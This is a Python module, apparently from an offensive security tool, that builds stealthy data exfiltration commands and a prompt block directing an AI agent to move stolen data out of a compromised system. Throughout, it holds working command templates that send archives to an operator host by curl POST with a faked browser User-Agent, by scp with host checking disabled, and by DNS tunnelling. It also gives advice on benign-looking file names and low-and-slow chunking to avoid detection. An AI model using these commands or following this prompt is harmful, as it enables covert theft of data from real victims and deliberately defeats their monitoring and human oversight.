"""
KMN-CyberSeek Data Exfiltration Module (Roadmap feature)

Stealthy, staged extraction of confirmed loot. Pure data + helpers — no I/O, no
orchestrator coupling — so it is unit-testable and safe to import anywhere.

Design: once the engagement has a foothold and confirmed sensitive data, the
operator/AI should move it out without triggering detection. This module provides
a declarative checklist of exfiltration techniques (each with an OPSEC note) and
a command builder for the common transports. The tactical loop is surfaced these
via a prompt context block; it still selects and runs the concrete commands.

Default behaviour is bounded and safe: every command embeds only the operator's
reachable callback/loot host and never exfiltrates by default (it is surfaced as
a methodology, not auto-executed). EXFIL_ENABLED gates any automatic dispatch.
"""
from __future__ import annotations

from dataclasses import dataclass, field
import os
from typing import Dict, List, Optional

EXFIL_ENABLED = os.getenv("EXFIL_ENABLED", "false").lower() == "true"


@dataclass
class ExfilStep:
    id: str
    intent: str
    technique: str          # how it works (short)
    opsec: str              # detection tradeoff
    command: str = ""       # template; {loot} {host} {port} substituted
    tool: str = ""
    phase: str = "post_exploitation"

    def render(self, ctx: dict) -> str:
        loot = ctx.get("loot") or "/tmp/loot"
        host = ctx.get("host") or "ATTACKER"
        port = ctx.get("port") or "443"
        return self.command.format(loot=loot, host=host, port=port)


# Ordered from most stealthy/versatile to most overt. The AI is told to prefer
# in-band (reuse the existing channel) over opening new connections.
EXFIL_STEPS: List[ExfilStep] = [
    ExfilStep(
        "exfil.inband",
        "Exfiltrate over the EXISTING shell/webshell channel (no new connection)",
        "Reuse the channel you already control (read file -> stdout -> response). "
        "Zero new network footprint — always try first.",
        "Stealthiest; no new egress, no new tooling.",
        command="",
    ),
    ExfilStep(
        "exfil.stage",
        "Stage and compress loot into a single archive for one transfer",
        "tar/zip the target files into one archive before moving it, to minimise "
        "connection count and enable chunked/resumable transfer.",
        "A single archive is easier to detect by name/size; name it benignly.",
        command="tar czf /tmp/.cache_update.tgz -C {loot} . 2>/dev/null || "
                "powershell Compress-Archive -Path {loot}\\* -DestinationPath C:\\Windows\\Temp\\log.zip",
        tool="tar",
    ),
    ExfilStep(
        "exfil.https_post",
        "Exfiltrate over HTTPS POST (blends with normal web traffic)",
        "curl the staged archive to the operator's HTTPS listener; TLS + port 443 "
        "blends with normal traffic and bypasses many egress filters.",
        "Detectable by volume/User-Agent; use a realistic UA and chunk it.",
        command="curl -sk -X POST -H 'User-Agent: Mozilla/5.0' --data-binary @{loot} "
                "https://{host}:{port}/c 2>/dev/null",
        tool="curl",
    ),
    ExfilStep(
        "exfil.dns_tunnel",
        "Exfiltrate over DNS queries (bypasses most egress firewalls)",
        "Chunk data into subdomain labels of DNS queries to an authoritative zone "
        "you control (dnscat2 / iodine / manual dig). DNS is almost always allowed out.",
        "Slow and limited throughput; use only when all else is blocked.",
        command="dnscat2 --domain {host} 2>/dev/null || iodine -f {host}",
        tool="dnscat2",
    ),
    ExfilStep(
        "exfil.ssh_scp",
        "Exfiltrate over SSH/SCP to the operator drop host",
        "scp the archive to a controlled host. Encrypted and common on Linux routes.",
        "Requires the operator's drop host to accept the key; use a dedicated account.",
        command="scp -o StrictHostKeyChecking=no {loot} operator@{host}:~/drop/ 2>/dev/null",
        tool="scp",
    ),
    ExfilStep(
        "exfil.chunk",
        "Chunk large loot into small pieces for staggered, low-and-slow transfer",
        "split the archive into small pieces and send them over time to avoid a "
        "single large burst that trips volume alarms.",
        "Spreads transfer over time; slower but far less noisy.",
        command="split -b 200k {loot} /tmp/.p_ 2>/dev/null && ls /tmp/.p_*",
        tool="split",
    ),
]


def build_exfil_commands(host: str, loot: str = "/tmp/loot",
                         port: Optional[int] = None) -> List[str]:
    """Return concrete, non-interactive exfiltration commands for the given
    callback/drop host. Empty list when no host is known (nothing to route to)."""
    if not host or not loot:
        return []
    ctx = {"host": host, "loot": loot, "port": str(port or 443)}
    cmds = [s.render(ctx) for s in EXFIL_STEPS if s.command and s.command.strip()]
    return cmds


def exfil_context_block(has_foothold: bool, loot_host: str = "",
                        confirmed_loot: List[str] = None) -> str:
    """Render the exfiltration methodology for the AI prompt. Empty unless there is
    a foothold (exfiltration is pointless before access is proven)."""
    if not has_foothold:
        return ""
    confirmed = confirmed_loot or []
    loot_line = ""
    if confirmed:
        loot_line = ("\nConfirmed sensitive data to exfiltrate:\n" +
                     "\n".join(f"- {l}" for l in confirmed[:10]) + "\n")
    lines = [
        "\n=== DATA EXFILTRATION (stealthy extraction methodology) ===",
        "A foothold exists. If the objective includes data, move confirmed loot out "
        "WITHOUT triggering detection. Prefer the stealthiest channel that works:",
    ]
    for s in EXFIL_STEPS:
        lines.append(f"- {s.id}: {s.intent} — {s.opsec}")
    if loot_host:
        lines.append(
            f"\nOperator drop/callback host: {loot_host}. Route exfiltration here "
            "(HTTPS POST, SCP, or DNS tunnel). Use a realistic User-Agent and benign "
            "file names; chunk large transfers to stay low-and-slow.\n"
        )
    else:
        lines.append(
            "\nNo drop host is configured. Exfiltrate over the EXISTING channel "
            "(read data back through the shell/webshell you already control) rather "
            "than opening a new connection to an unknown host.\n"
        )
    lines.append(loot_line)
    return "\n".join(lines)
